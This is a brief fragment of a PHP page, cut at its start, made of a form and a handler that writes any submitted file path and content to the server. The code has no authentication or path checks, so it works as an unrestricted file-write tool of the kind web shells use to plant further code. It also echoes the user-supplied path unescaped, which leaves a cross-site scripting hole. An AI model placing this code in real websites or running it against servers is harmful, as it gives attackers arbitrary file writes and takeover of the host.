 <form method="POST" action="">
        <input type="text" name="filePath" placeholder="Enter file path (e.g., /path/to/file.txt)" required>
        <textarea name="fileContent" placeholder="Enter file content"></textarea>
        <button type="submit" name="createFile">Create File</button>
    </form>

    <pre>
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['createFile']) && !empty($_POST['filePath'])) {
        $filePath = trim($_POST['filePath']);
        $fileContent = $_POST['fileContent'] ?? '';
        if (file_put_contents($filePath, $fileContent) !== false) {
            echo "File '$filePath' created successfully.\n";
        } else {
            echo "Failed to create file '$filePath'.\n";
        }
    }
}
?>
